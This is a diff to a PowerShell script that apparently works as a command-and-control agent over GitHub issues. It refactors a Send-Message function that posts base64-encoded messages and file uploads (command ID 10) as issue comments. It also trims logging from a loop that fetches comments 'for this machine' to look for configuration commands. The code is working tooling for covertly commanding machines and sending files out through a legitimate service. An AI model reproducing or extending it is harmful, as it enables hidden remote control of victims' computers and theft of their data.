@@ -21,29 +21,23 @@ function Send-Message
 
     try
     {
-        #Default switch encodes the body and doesn't add any additional paramters
-        switch ($commandID)
+        #10 File upload to GitHub command. Don't encode the body as the file is already encoded.
+        If($commandID -eq 10)
         {
-            10 #File upload to GitHub command. Don't encode the body as the file is already encoded.
-            {
-                $mergedBody = "[" + $commandID + "]:[" + $p1 + "]:" + $body
-			    New-GitHubComment -OwnerName $user -RepositoryName $repository -Issue $issue -Body $mergedBody
-                break
-            }
-
-            default
-            {
-                Write-Console -Message ("Default switch entered.")
-                Write-Console -Message ("body is currently set to " + $body)
-                $encodedBody = [System.Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes($body))
-                Write-Console -Message ("encodedBody is currently set to " + $encodedBody)
-                $mergedBody = "[" + $commandID + "]:" + $encodedBody
-                Write-Console -Message ("Merged body is " + $mergedBody)
-                New-GitHubComment -OwnerName $user -RepositoryName $repository -Issue $issue -Body ([string]"$mergedBody")
-                Start-Sleep -s 3
-                break
-            }
+            $mergedBody = "[" + $commandID + "]:[" + $p1 + "]:" + $body
+            New-GitHubComment -OwnerName $user -RepositoryName $repository -Issue $issue -Body $mergedBody
         }
+        #Default: encode the body
+        Else
+        {
+            Write-Console -Message ("Default switch entered.")
+            Write-Console -Message ("body is currently set to " + $body)
+            $encodedBody = [System.Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes($body))
+            Write-Console -Message ("encodedBody is currently set to " + $encodedBody)
+            $mergedBody = "[" + $commandID + "]:" + $encodedBody
+            Write-Console -Message ("Merged body is " + $mergedBody)
+            New-GitHubComment -OwnerName $user -RepositoryName $repository -Issue $issue -Body ([string]"$mergedBody")
+        }           
     }
     catch
     {
@@ -181,8 +175,6 @@ function Start-LoopMode
         {
             Write-Console -Message ("Fetching all comments for this machine...")
             $comments = Get-GitHubComment -OwnerName $user -RepositoryName $repository -Issue $issue
-            Write-Console -Message ($comments)
-            Write-Console -Message ("Attempting to reverse comments...")
             [array]::Reverse($comments)
             Write-Console -Message ("Done. Checking for configuration command...")
         }
